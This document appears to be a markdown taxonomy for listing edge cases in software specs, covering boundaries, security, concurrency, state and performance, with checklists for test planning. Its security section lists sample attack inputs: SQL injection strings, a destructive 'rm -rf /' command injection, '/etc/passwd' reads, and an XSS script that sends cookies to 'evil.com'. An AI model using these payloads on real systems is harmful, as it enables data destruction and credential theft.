# Edge Case Taxonomy

A comprehensive taxonomy for identifying and categorizing edge cases in software specifications.

## Categories

### 1. Boundary Conditions

Edge cases related to input boundaries, limits, and extremes.

#### Empty/Null Values
- **Empty strings**: `""`, `''`
- **Null/undefined**: `null`, `undefined`, `None`
- **Empty collections**: `[]`, `{}`, `Set()`, `Map()`
- **Whitespace-only**: `"   "`, `"\t\n"`

**Examples**:
- Empty email field in login form
- Null value passed to required parameter
- Array with zero elements
- String containing only spaces

#### Min/Max Ranges
- **Minimum values**: Zero, negative numbers, smallest allowed value
- **Maximum values**: Largest number, string length limits, collection size limits
- **Off-by-one**: Boundaries ±1 from limit
- **Overflow**: Values exceeding maximum capacity

**Examples**:
- Password with 1 character (below minimum)
- Text input with 10,000 characters (at limit)
- Array with max_int elements
- Date set to year 9999

#### Format Violations
- **Invalid format**: Email without @, phone with letters
- **Partial input**: Incomplete credit card number
- **Wrong type**: String where number expected
- **Encoding issues**: Unicode, UTF-8, special characters

**Examples**:
- Email: `notanemail` (missing @)
- Phone: `555-CALL` (contains letters)
- Age: `"twenty"` (string instead of number)
- Name with emoji: `John 😊 Doe`

---

### 2. Security

Edge cases related to security vulnerabilities and attack vectors.

#### Injection Attacks
- **SQL injection**: `' OR '1'='1`, `'; DROP TABLE users;--`
- **XSS (Cross-Site Scripting)**: `<script>alert('XSS')</script>`
- **Command injection**: `; rm -rf /`, `$(malicious_command)`
- **LDAP injection**: `*)(uid=*))(|(uid=*`
- **XML injection**: `<!--`, `<![CDATA[`

**Examples**:
- Username field: `admin' OR '1'='1'--`
- Comment field: `<script>fetch('evil.com', {body: document.cookie})</script>`
- Search query: `test; cat /etc/passwd`

#### Authentication/Authorization
- **Bypassing authentication**: Direct URL access, session manipulation
- **Privilege escalation**: Regular user accessing admin functions
- **Broken authentication**: Weak passwords, no rate limiting
- **Session hijacking**: Stolen tokens, replay attacks

**Examples**:
- Accessing `/admin` without login
- Changing user ID in request to access other user's data
- No lockout after failed login attempts
- JWT token with `admin: true` added by client

#### Data Exposure
- **Sensitive data leakage**: Passwords in logs, PII in error messages
- **Insecure storage**: Plain text passwords, unencrypted data
- **Insecure transmission**: HTTP instead of HTTPS
- **Information disclosure**: Stack traces, detailed error messages

**Examples**:
- Error message: `Login failed for user admin with password abc123`
- Password stored as plain text in database
- API returns full user object including password hash
- Debug logs containing credit card numbers

---

### 3. Concurrency

Edge cases involving simultaneous operations and race conditions.

#### Race Conditions
- **Read-modify-write**: Two threads updating same value
- **Check-then-act**: Condition changes between check and action
- **Double-spend**: Same resource used twice
- **Lost updates**: Concurrent writes overwrite each other

**Examples**:
- Two users booking last available seat simultaneously
- Balance check passes, but account depleted before withdrawal
- Inventory decremented twice for same purchase
- Two processes creating user with same email

#### Deadlocks
- **Mutual waiting**: Process A waits for B, B waits for A
- **Resource contention**: Multiple processes competing for locks
- **Circular dependencies**: Chain of processes waiting on each other

**Examples**:
- Transaction 1 locks users table, waits for orders table
- Transaction 2 locks orders table, waits for users table
- Result: Both transactions stuck forever

#### Synchronization Issues
- **Dirty reads**: Reading uncommitted changes
- **Phantom reads**: Different results from same query
- **Non-repeatable reads**: Value changes during transaction
- **Cache invalidation**: Stale data in distributed cache

**Examples**:
- User sees order total before tax calculation finishes
- Query returns 5 results, then 7 results on retry
- Account balance changes mid-transaction
- Cached user profile doesn't reflect recent update

---

### 4. State Transitions

Edge cases related to invalid states and state changes.

#### Invalid State Transitions
- **Illegal transitions**: Moving from state A to state C without B
- **Missing states**: Skipping required intermediate states
- **Backwards transitions**: Reverting to previous state when not allowed
- **Terminal states**: Operations on completed/cancelled items

**Examples**:
- Order shipped before payment confirmed
- User deletes account while active subscription exists
- Reopening completed ticket
- Editing published article in final state

#### Expired Resources
- **Session timeout**: Token/session expires mid-operation
- **Resource expiration**: Temporary links, passwords resets expire
- **Time-based state**: Offers expire, subscriptions lapse
- **Stale data**: Using outdated information

**Examples**:
- JWT token expires during multi-step checkout
- Password reset link used after 24-hour expiration
- Coupon code expired between cart and checkout
- User's role changed after permission check but before action

#### Orphaned Resources
- **Dangling references**: References to deleted entities
- **Incomplete cleanup**: Related data not deleted
- **Cascade failures**: Dependent items left in limbo
- **Missing relationships**: Required foreign keys null

**Examples**:
- Comment references deleted user
- Deleted product still in user's cart
- Order items remain after order deletion
- User profile missing required company reference

---

### 5. Performance

Edge cases related to system performance and resource limits.

#### Large Datasets
- **Bulk operations**: Processing thousands/millions of records
- **Large files**: Multi-GB uploads, processing
- **Deep nesting**: Deeply nested objects/arrays
- **Long strings**: Text fields with megabytes of data

**Examples**:
- Exporting 1 million user records to CSV
- Uploading 5GB video file
- JSON with 100 levels of nesting
- Comment field with 1MB of text

#### Timeout Scenarios
- **Network timeouts**: Slow connections, packet loss
- **Processing timeouts**: Long-running operations
- **Database timeouts**: Slow queries, lock waits
- **Third-party timeouts**: External API delays

**Examples**:
- API request takes 60+ seconds (exceeds timeout)
- Complex report generation takes 10 minutes
- Database query locks for 30 seconds
- Payment gateway doesn't respond

#### Resource Exhaustion
- **Memory**: Out of memory, memory leaks
- **CPU**: High CPU usage, infinite loops
- **Disk**: Full disk, no space for writes
- **Connections**: Pool exhausted, too many open files

**Examples**:
- Application crashes with OutOfMemoryError
- Background job consumes 100% CPU
- Log file fills disk causing write failures
- Database connection pool exhausted

#### Rate Limiting
- **Too many requests**: Exceeding API rate limits
- **Brute force**: Rapid repeated attempts
- **DDoS patterns**: Flood of requests
- **Burst traffic**: Sudden spike in usage

**Examples**:
- User makes 1000 API calls in 1 minute
- Login attempted 100 times in 10 seconds
- Signup endpoint hit 10,000 times simultaneously
- Normal traffic increases 100x during sale

---

## Using the Taxonomy

### During Spec Creation

For each feature, systematically consider each category:

1. **Boundary**: What are the input limits? What about empty/null?
2. **Security**: How could an attacker exploit this? What about injections?
3. **Concurrency**: What if two users do this simultaneously?
4. **State**: What invalid states are possible? What about expired resources?
5. **Performance**: What if there are millions of records? What about timeouts?

### Edge Case Template

```markdown
**EC-001**: [Short Description]
- **Category**: [boundary|security|concurrency|state|performance]
- **Scenario**: [Detailed scenario]
- **Expected**: [Expected system behavior]
- **Test Required**: [Yes|No]
```

### Example

```markdown
**EC-003**: SQL Injection in Email Field
- **Category**: Security
- **Scenario**: User enters `' OR '1'='1'--` in email field during login
- **Expected**: Input sanitized using parameterized queries, no SQL execution
- **Test Required**: Yes
```

---

## Common Patterns

### API Endpoints

Checklist for API edge cases:
- [ ] Empty request body
- [ ] Missing required fields
- [ ] Extra unexpected fields
- [ ] Invalid JSON format
- [ ] SQL injection in parameters
- [ ] XSS in text fields
- [ ] Concurrent requests to same resource
- [ ] Request timeout (slow network)
- [ ] Rate limit exceeded
- [ ] Invalid authentication token
- [ ] Expired authentication token
- [ ] Insufficient permissions

### User Input Forms

Checklist for form edge cases:
- [ ] All fields empty
- [ ] Each field individually empty
- [ ] Fields with only whitespace
- [ ] Maximum length strings
- [ ] Special characters in text
- [ ] XSS payloads
- [ ] SQL injection attempts
- [ ] Form submitted multiple times
- [ ] Browser back button after submission
- [ ] Session expires during fill-out

### Database Operations

Checklist for database edge cases:
- [ ] Empty result set
- [ ] Single result when expecting many
- [ ] Millions of results
- [ ] Duplicate keys
- [ ] Null foreign keys
- [ ] Concurrent updates to same record
- [ ] Transaction timeout
- [ ] Connection pool exhausted
- [ ] Database offline/unreachable
- [ ] Disk full (write failure)

### File Operations

Checklist for file edge cases:
- [ ] File doesn't exist
- [ ] File is empty (0 bytes)
- [ ] File is huge (multi-GB)
- [ ] Insufficient permissions
- [ ] File is locked by another process
- [ ] Disk full
- [ ] Invalid file format
- [ ] Malicious file content
- [ ] File path traversal (../../etc/passwd)
- [ ] Unicode in filename

---

## Prioritization

Not all edge cases are equal. Prioritize by:

1. **Must Handle**:
   - Security vulnerabilities
   - Data corruption risks
   - System crashes
   - Privacy violations

2. **Should Handle**:
   - Poor user experience
   - Performance issues
   - State consistency
   - Data validation

3. **Could Handle**:
   - Rare scenarios
   - Nice-to-have validations
   - Informative errors
   - Edge case optimizations

Mark each edge case with test requirement:
- **Test Required: Yes** - Must have automated test
- **Test Required: No** - Document only (very rare scenarios)
